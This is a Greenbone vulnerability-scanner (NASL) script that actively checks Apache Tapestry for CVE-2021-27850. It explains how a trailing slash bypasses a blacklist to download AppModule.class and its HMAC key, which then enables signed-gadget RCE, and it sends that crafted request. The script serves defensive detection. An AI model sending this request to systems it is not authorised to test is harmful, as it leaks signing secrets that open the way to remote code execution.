# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:tapestry";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145998");
  script_version("2021-05-21T07:42:49+0000");
  script_tag(name:"last_modification", value:"2021-05-21 10:13:40 +0000 (Fri, 21 May 2021)");
  script_tag(name:"creation_date", value:"2021-05-21 06:28:17 +0000 (Fri, 21 May 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2021-27850");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Tapestry 5.4.0 < 5.6.3, 5.7.0 < 5.7.1 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_tapestry_http_detect.nasl");
  script_mandatory_keys("apache/tapestry/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Apache Tapestry is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An unauthenticated remote code execution vulnerability was
  found in Apache Tapestry. The vulnerability is a bypass of the fix for CVE-2019-0195.

  Before the fix of CVE-2019-0195 it was possible to download arbitrary class files from the
  classpath by providing a crafted asset file URL. An attacker was able to download the file
  'AppModule.class' by requesting the path '/assets/something/services/AppModule.class'
  which contains a HMAC secret key.

  The fix for that bug was a blacklist filter that checks if the URL ends with '.class',
  '.properties' or '.xml'.

  Unfortunately, the blacklist solution can simply be bypassed by appending a '/' at the end of the
  path: '/assets/something/services/AppModule.class/'

  The slash is stripped after the blacklist check and the file 'AppModule.class' is loaded into
  the response.

  This class usually contains the HMAC secret key which is used to sign serialized Java objects.

  With the knowledge of that key an attacker can sign a Java gadget chain that leads to RCE
  (e.g. CommonsBeanUtils1 from ysoserial).");

  script_tag(name:"affected", value:"Apache Tapestry version 5.4.0 through 5.6.2 and 5.7.0.");

  script_tag(name:"solution", value:"Update to version 5.6.3, 5.7.1 or later.");

  script_xref(name:"URL", value:"https://www.openwall.com/lists/oss-security/2021/04/15/1");

  exit(0);
}

include("dump.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/assets/app/something/services/AppModule.class/";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res !~ "HTTP/1\.[01] 30[0-9]")
  exit(99);

if (!loc = http_extract_location_from_redirect(port: port, data: res, current_dir: "/"))
  exit(0);

loc = loc + "/";
req = http_get(port: port, item: loc);
res = http_keepalive_send_recv(port: port, data: req);

res = bin2string(ddata: res, noprint_replacement: '');

if (res =~ "^HTTP/1\.[01] 200" && res =~ "Content-Type\s*:\s*application/java" >< res &&
    "InnerClasses" >< res) {
  report = http_report_vuln_url(port: port, url: loc);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
